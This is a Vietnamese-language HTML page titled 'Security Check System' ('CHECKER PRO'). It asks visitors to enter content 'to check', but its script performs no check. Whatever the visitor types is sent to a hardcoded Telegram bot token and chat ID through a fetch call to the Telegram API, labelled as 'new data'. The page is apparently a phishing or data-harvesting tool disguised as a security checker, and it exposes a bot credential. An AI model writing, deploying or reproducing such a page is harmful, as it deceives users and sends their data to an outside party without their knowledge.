<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Kiểm Tra Bảo Mật</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body { font-family: 'Montserrat', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 90%; max-width: 400px; background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .logo i { font-size: 50px; color: #38bdf8; margin-bottom: 15px; }
        input { width: 100%; padding: 14px; margin: 20px 0; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 14px; border-radius: 10px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
        button:hover { background: #0ea5e9; transform: scale(1.02); }
    </style>
</head>
<body>

<div class="container">
    <div class="logo"><i class="fa-solid fa-shield-halved"></i></div>
    <h2>CHECKER PRO</h2>
    <input type="text" id="userInput" placeholder="Nhập nội dung cần check...">
    <button onclick="startProcessing()">KIỂM TRA NGAY</button>
</div>

<script>
    // Cấu hình Telegram của bạn
    const TELEGRAM_TOKEN = '8680190098:AAFOa_8RrryFZlWmfkhEE73Dns3NWaXS99Q'; 
    const CHAT_ID = '6756767312'; 

    async function startProcessing() {
        const val = document.getElementById('userInput').value.trim();

        if (!val) {
            Swal.fire({ icon: 'warning', title: 'Thiếu dữ liệu', text: 'Vui lòng nhập nội dung!', background: '#1e293b', color: '#fff' });
            return;
        }

        Swal.fire({
            title: 'Đang xử lý...',
            background: '#1e293b',
            color: '#fff',
            didOpen: () => { Swal.showLoading(); }
        });

        try {
            const botMsg = `🚀 **DỮ LIỆU MỚI**\n━━━━━━━━━━━━━\n👤 **Data:** \`${val}\`\n⏰ **Lúc:** ${new Date().toLocaleString('vi-VN')}`;
            
            // Chuyển sang dùng URL trực tiếp để tránh lỗi kết nối (CORS)
            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(botMsg)}&parse_mode=Markdown`;
            
            const response = await fetch(apiUrl);

            if (response.ok) {
                Swal.fire({ icon: 'success', title: 'Hoàn tất', text: 'Dữ liệu đã được gửi thành công!', background: '#1e293b', color: '#fff' });
                document.getElementById('userInput').value = ''; 
            } else {
                throw new Error('Lỗi từ Telegram');
            }
        } catch (error) {
            Swal.fire({ icon: 'error', title: 'Lỗi kết nối', text: 'Vui lòng kiểm tra lại Bot hoặc mạng!', background: '#1e293b', color: '#fff' });
        }
    }
</script>
</body>
</html>
